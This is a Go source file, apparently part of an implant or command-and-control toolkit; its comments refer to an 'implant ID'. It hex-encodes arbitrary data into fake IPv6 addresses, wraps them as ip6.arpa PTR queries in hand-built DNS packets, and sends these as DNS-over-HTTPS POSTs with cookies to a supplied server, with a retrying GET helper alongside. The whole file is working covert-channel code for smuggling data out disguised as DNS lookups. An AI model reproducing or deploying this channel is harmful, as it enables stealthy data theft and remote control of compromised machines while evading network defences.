//go:build withDns

package shared

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// GetDataRequest makes a GET request to the given URL
// It takes in 3 parameters
// 1) The base URL to make the request to
// 2) The maximum number of retries before giving up
// 3) The query parameters to include in the request
// It returns the response and any error that occurred
func GetDataRequest(baseUrl string, maxRetries int, cookies ...*http.Cookie) (*http.Response, error) {
	//fmt.Println("In GetDataRequest")
	var resp *http.Response
	var err error

	// Parse the base URL
	reqURL, err := url.Parse(baseUrl)
	//fmt.Printf("Parsing req URL %s\n", reqURL)
	if err != nil {
		//fmt.Println(err)
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Create an HTTP client
	client := &http.Client{}
	//fmt.Println("Created client")

	for attempts := 0; attempts < maxRetries; attempts++ {
		// Create a new request for each attempt
		//fmt.Println("Attempt #" + strconv.Itoa(attempts))
		req, err := http.NewRequest("GET", reqURL.String(), nil)
		//fmt.Printf("%v\n", req)
		if err != nil {
			//fmt.Println(err)
			return nil, fmt.Errorf("failed to create request: %w", err)
		}

		// Add cookies to the request
		for _, cookie := range cookies {
			//fmt.Println(cookie)
			req.AddCookie(cookie)
		}

		// Send the request
		resp, err = client.Do(req)
		//fmt.Printf("%v\n", resp)
		if err == nil {

			// Success, return the response
			return resp, nil
		}

		// Log the error and retry after a delay
		fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
		time.Sleep(10 * time.Second)
	}

	// Return the last error after exhausting retries
	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
}

// SendDataRequest sends a PTR request to the target server
// Takes in the URL, params to encode into a list, the max retries, and the cookies
// The IP is the encoded data and the ID should be the implant ID hex encoded
// The function input parameters matches the HTTP request package
// SendDataRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
func SendDataRequest(baseUrl string, params string, maxRetries int, cookies ...*http.Cookie) error {
	// Convert the input to a list of IPv6 addresses
	ipFormData := StringToIPv6List(params)
	// Format it for PTR requests
	ptrDomain := formatPTR(ipFormData)

	// Build the DNS packet
	var dnsPacket bytes.Buffer
	ptrRCount := uint16(len(ptrDomain))

	// Header
	header := struct {
		ID      uint16
		Flags   uint16
		QDCount uint16
		ANCount uint16
		NSCount uint16
		ARCount uint16
	}{
		// The transaction ID may be used for implant ID, but right now it's not
		ID: 0x04d2, // 1234 in hex
		// ID:      impId,
		Flags:   0x0100,    // Standard recursive query
		QDCount: ptrRCount, // 1 question
	}
	binary.Write(&dnsPacket, binary.BigEndian, header)

	// Question section: Encode domain name
	for _, domain := range ptrDomain {
		labels := strings.Split(domain, ".")
		for _, label := range labels {
			dnsPacket.WriteByte(byte(len(label)))
			dnsPacket.WriteString(label)
		}
		dnsPacket.WriteByte(0) // End of domain name

		// Type and Class
		question := struct {
			Type  uint16
			Class uint16
		}{
			Type:  12, // PTR
			Class: 1,  // IN
		}
		binary.Write(&dnsPacket, binary.BigEndian, question)
	}

	// Send the packet over HTTP
	client := &http.Client{}
	req, err := http.NewRequest("POST", baseUrl, &dnsPacket)
	if err != nil {
		//fmt.Println("Error creating request:", err)

		return err
	}
	req.Header.Set("Content-Type", "application/dns-message")

	// Add cookies to the request
	for _, cookie := range cookies {
		//fmt.Println(cookie)
		req.AddCookie(cookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		// fmt.Println("Error making DoH request:", err)
		return err
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			return
		}
	}(resp.Body)

	// Read and display the response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		// fmt.Println("Error reading response:", err)
		return err
	}
	fmt.Printf("Raw DoH Response: %x\n", body)

	return nil
}

// Helper function to format PTR domains
// Input a list of IPs
// Returns a list of PTR formatted records
func formatPTR(ipLs []string) []string {
	var domains []string
	for _, ip := range ipLs {
		// Expand the IPv6 address to its full representation
		expandedIP := expandIPv6(ip)

		// Remove colons and reverse the characters
		reversed := []rune{}
		for _, char := range expandedIP {
			if char != ':' {
				reversed = append([]rune{char}, reversed...)
			}
		}

		// Join the reversed characters with dots and append ".ip6.arpa"
		domain := fmt.Sprintf("%s.ip6.arpa", strings.Join(strings.Split(string(reversed), ""), "."))
		domains = append(domains, domain)
	}
	return domains
}

// StringToIPv6List converts a string to a list of IPv6 addresses.
func StringToIPv6List(input string) []string {
	// Convert the input string to its hexadecimal representation
	hexStr := hex.EncodeToString([]byte(input))

	// Pad the hex string to make its length a multiple of 32 characters (16 bytes)
	if len(hexStr)%32 != 0 {
		padding := 32 - len(hexStr)%32
		hexStr += strings.Repeat("0", padding)
	}

	// Split the hex string into 32-character chunks, each forming an IPv6 address
	var ipv6Addresses []string
	for i := 0; i < len(hexStr); i += 32 {
		chunk := hexStr[i : i+32]

		// Format the chunk into an IPv6 address with 8 groups of 4 hex digits
		ipv6 := fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s",
			chunk[0:4], chunk[4:8], chunk[8:12], chunk[12:16],
			chunk[16:20], chunk[20:24], chunk[24:28], chunk[28:32])

		ipv6Addresses = append(ipv6Addresses, ipv6)
	}

	return ipv6Addresses
}

func expandIPv6(ip string) string {
	// Expands an IPv6 address to its full form
	parts := strings.Split(ip, ":")
	var fullParts []string
	for _, part := range parts {
		// Expand each part to 4 digits
		fullParts = append(fullParts, fmt.Sprintf("%04s", part))
	}

	// Join expanded parts
	return strings.Join(fullParts, ":")
}
